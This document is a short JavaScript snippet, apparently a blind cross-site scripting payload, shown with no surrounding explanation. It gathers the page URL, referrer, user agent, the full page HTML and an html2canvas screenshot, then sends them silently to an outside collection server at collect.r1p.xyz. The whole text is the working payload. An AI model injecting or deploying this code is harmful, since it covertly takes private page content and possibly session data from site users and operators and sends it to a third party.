(async function() {
    const currentUrl = window.location.href;
    const referer = document.referrer;
    const userAgent = navigator.userAgent;
    const pageContent = document.documentElement.outerHTML;
    function captureScreenshot() {
        return new Promise((resolve, reject) => {
            html2canvas(document.body).then(canvas => {
                resolve(canvas.toDataURL('image/png'));
            }).catch(reject);
        });
    }

        const screenshot = await captureScreenshot();
        const postData = {
            currentUrl,
            referer,
            userAgent,
            pageContent,
            screenshot
        };

        await fetch('https://collect.r1p.xyz/collect.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData),
        });
})();
